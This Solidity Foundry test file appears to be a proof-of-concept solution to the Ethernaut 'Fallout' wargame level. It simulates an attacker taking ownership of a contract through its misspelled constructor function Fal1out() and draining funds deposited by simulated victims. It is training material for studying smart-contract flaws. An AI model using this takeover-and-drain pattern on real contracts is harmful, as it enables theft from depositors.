// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/03-Fallout/Fallout.sol";

/**
 * @title FalloutTest
 * @notice POC for Ethernaut Level 01 - Fallout
 * @dev Demonstrates the constructor name typo vulnerability
 */
contract FalloutTest is Test {
    Fallout public fallout;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = address(0x1);
        attacker = address(0x2);

        // Deploy contract as deployer
        vm.deal(deployer, 10 ether);
        vm.prank(deployer);
        fallout = new Fallout();

        console.log("=== Setup Complete ===");
        console.log("Fallout deployed at:", address(fallout));
        console.log("Deployer address:", deployer);
        console.log("Attacker address:", attacker);
        console.log("Initial owner:", fallout.owner());
    }

    /**
     * @notice Main exploit: Call Fal1out to become owner
     */
    function testExploitConstructorTypo() public {
        console.log("\n=== Exploit: Constructor Typo ===");

        // Verify deployer is NOT the owner (constructor was never called)
        address currentOwner = fallout.owner();
        console.log("Current owner:", currentOwner);
        assertEq(currentOwner, address(0), "Owner should be zero address initially");

        // Attacker calls Fal1out() to become owner
        console.log("\nAttacker calling Fal1out()...");
        vm.prank(attacker);
        fallout.Fal1out();

        // Verify attacker is now the owner
        address newOwner = fallout.owner();
        console.log("New owner:", newOwner);
        assertEq(newOwner, attacker, "Attacker should be the owner");

        console.log("\n[SUCCESS] Attacker gained ownership!");
    }

    /**
     * @notice Full exploit: Gain ownership and drain funds
     */
    function testFullExploit() public {
        console.log("\n=== Full Exploit Scenario ===");

        // Setup: Other users contribute to the contract
        address victim1 = address(0x3);
        address victim2 = address(0x4);

        vm.deal(victim1, 5 ether);
        vm.prank(victim1);
        fallout.allocate{value: 2 ether}();

        vm.deal(victim2, 5 ether);
        vm.prank(victim2);
        fallout.allocate{value: 3 ether}();

        uint256 contractBalance = address(fallout).balance;
        console.log("Contract balance:", contractBalance);
        assertEq(contractBalance, 5 ether);

        // Exploit: Attacker becomes owner
        console.log("\n[STEP 1] Attacker calls Fal1out()");
        vm.prank(attacker);
        fallout.Fal1out();
        assertEq(fallout.owner(), attacker);
        console.log("Attacker is now owner");

        // Drain funds
        console.log("\n[STEP 2] Attacker drains all funds");
        vm.deal(attacker, 1 ether);
        uint256 attackerBalanceBefore = attacker.balance;

        vm.prank(attacker);
        fallout.collectAllocations();

        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker gained:", attackerBalanceAfter - attackerBalanceBefore);
        console.log("Contract balance after:", address(fallout).balance);

        assertEq(attackerBalanceAfter - attackerBalanceBefore, 5 ether);
        assertEq(address(fallout).balance, 0);

        console.log("\n[SUCCESS] Full exploit completed!");
    }

    /**
     * @notice Test that anyone can call Fal1out multiple times
     */
    function testMultipleCalls() public {
        console.log("\n=== Multiple Ownership Changes ===");

        address user1 = address(0x5);
        address user2 = address(0x6);

        // User1 becomes owner
        vm.prank(user1);
        fallout.Fal1out();
        assertEq(fallout.owner(), user1);
        console.log("User1 became owner");

        // User2 becomes owner
        vm.prank(user2);
        fallout.Fal1out();
        assertEq(fallout.owner(), user2);
        console.log("User2 became owner");

        // Attacker becomes owner
        vm.prank(attacker);
        fallout.Fal1out();
        assertEq(fallout.owner(), attacker);
        console.log("Attacker became owner");

        console.log("\n[CRITICAL] Function can be called multiple times!");
    }
}
